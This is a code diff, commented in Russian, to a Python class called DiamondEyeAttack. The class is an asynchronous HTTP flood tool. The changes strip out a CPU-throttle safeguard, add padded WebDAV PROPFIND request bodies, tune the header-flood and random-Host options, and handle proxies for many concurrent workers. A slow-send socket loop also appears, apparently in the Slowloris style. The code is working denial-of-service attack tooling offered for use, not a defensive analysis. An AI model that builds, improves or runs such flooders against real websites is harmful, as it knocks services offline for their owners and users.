@@ -5,6 +5,7 @@ import time
 from urllib.parse import urlparse
 from typing import List, Dict
 import psutil
+import argparse  # ✅ Добавлено: для безопасного создания Namespace
 
 from utils import generate_headers, parse_data_size, random_string
 from colorama import Fore, Style
@@ -32,7 +33,12 @@ class DiamondEyeAttack:
         self.path_fuzz = path_fuzz
         self.header_flood = header_flood
         self.method_fuzz = method_fuzz
-        self.args = args or argparse.Namespace()  # ✅ Защита от None
+        self.args = args if args is not None else argparse.Namespace()
+
+        # ✅ Установка атрибутов по умолчанию
+        for attr in ['junk', 'header_flood', 'random_host']:
+            if not hasattr(self.args, attr):
+                setattr(self.args, attr, False)
 
         # CTF paths
         self.ctf_paths = [
@@ -63,7 +69,6 @@ class DiamondEyeAttack:
         self._monitor_task = None
         self._rps_task = None
 
-        # ✅ Инициализация psutil
         psutil.cpu_percent(interval=None)
 
     async def start(self):
@@ -82,8 +87,12 @@ class DiamondEyeAttack:
         }
         if self.use_http2:
             base_kwargs["http2"] = True
-        if self.proxy:
-            base_kwargs["proxies"] = {"all://": self.proxy}  # ✅ Исправлено
+
+        # ✅ Фикс: proxy + http2
+        if self.proxy and not self.use_http2:
+            base_kwargs["proxies"] = {"all://": self.proxy}
+        elif self.proxy and self.use_http2:
+            print(f"{Fore.YELLOW}⚠️  HTTP/2 не поддерживает прокси — отключено{Style.RESET_ALL}")
 
         tasks = [asyncio.create_task(self.worker(base_kwargs)) for _ in range(self.workers)]
         self._monitor_task = asyncio.create_task(self.monitor())
@@ -103,36 +112,31 @@ class DiamondEyeAttack:
                 clients.append(client)
 
             while not self._shutdown_event.is_set():
-                # ✅ Исправлено: cpu_percent(interval=None)
-                if psutil.cpu_percent(interval=None) > 95:
-                    await asyncio.sleep(0.1)
-                    continue
-
                 method = self.get_random_method()
                 url = self.build_random_url()
-
-                # ✅ Исправлено: защита от None
-                use_junk = getattr(self.args, 'junk', False)
-                use_random_host = getattr(self.args, 'random_host', False)
-                header_flood = getattr(self.args, 'header_flood', False)
 
                 headers = generate_headers(
                     self.host,
                     self.useragents,
                     self.referers,
-                    use_junk=use_junk,
-                    use_random_host=use_random_host,
-                    header_flood=header_flood
+                    use_junk=self.args.junk,
+                    use_random_host=self.args.random_host,
+                    header_flood=self.args.header_flood
                 )
 
                 data = None
                 BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
                 if method in BODY_METHODS and self.data_size > 0:
-                    if random.random() < 0.5:
-                        payload_size = max(1, self.data_size - 15)
-                        data = f'{{"d": "{random_string(payload_size)}"}}'
+                    if method in {'PROPFIND', 'REPORT', 'LOCK', 'MKCOL'}:
+                        data = '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'
+                        if self.data_size > len(data):
+                            data += 'X' * (self.data_size - len(data))
                     else:
-                        data = 'X' * self.data_size
+                        if random.random() < 0.5:
+                            payload_size = max(1, self.data_size - 15)
+                            data = f'{{"d": "{random_string(payload_size)}"}}'
+                        else:
+                            data = 'X' * self.data_size
 
                 if self.extreme:
                     temp_client = httpx.AsyncClient(**base_kwargs)
@@ -140,7 +144,7 @@ class DiamondEyeAttack:
                         await temp_client.__aenter__()
                         await self.send_request(temp_client, method, url, headers, data)
                     finally:
-                        await temp_client.aclose()
+                        await temp_client.aclose()  # ✅ Гарантировано закрываем
                 else:
                     client = random.choice(clients)
                     await self.send_request(client, method, url, headers, data)
@@ -161,7 +165,6 @@ class DiamondEyeAttack:
                     pass
 
     def build_random_url(self) -> str:
-        # ✅ Один метод — CTF + path-fuzz
         if self.flood and self.path_fuzz and random.random() < 0.3:
             path = random.choice(self.ctf_paths)
         else:
@@ -172,7 +175,14 @@ class DiamondEyeAttack:
             path += "/" + "/".join(random_string(8) for _ in range(depth))
 
         query = f"?t={random.randint(1000, 9999)}"
-        return self.base_url + path + query
+        full = self.base_url + path + query
+
+        # ✅ Фикс: слишком длинный URL
+        if len(full) > 512:
+            path = path[:512 - len(self.base_url) - len(query) - 10]
+            full = self.base_url + path + query
+
+        return full
 
     async def send_request(self, client, method, url, headers, data):
         try:
@@ -203,18 +213,13 @@ class DiamondEyeAttack:
             await writer.drain()
             await asyncio.sleep(0.5)
 
-            # ✅ Исправлено: use_junk и header_flood
-            use_junk = getattr(self.args, 'junk', False)
-            use_random_host = getattr(self.args, 'random_host', False)
-            header_flood = getattr(self.args, 'header_flood', False)
-
             headers = generate_headers(
                 self.host,
                 self.useragents,
                 self.referers,
-                use_junk=use_junk,
-                use_random_host=use_random_host,
-                header_flood=header_flood
+                use_junk=self.args.junk,
+                use_random_host=self.args.random_host,
+                header_flood=self.args.header_flood
             )
             for k, v in headers.items():
                 if self._shutdown_event.is_set():
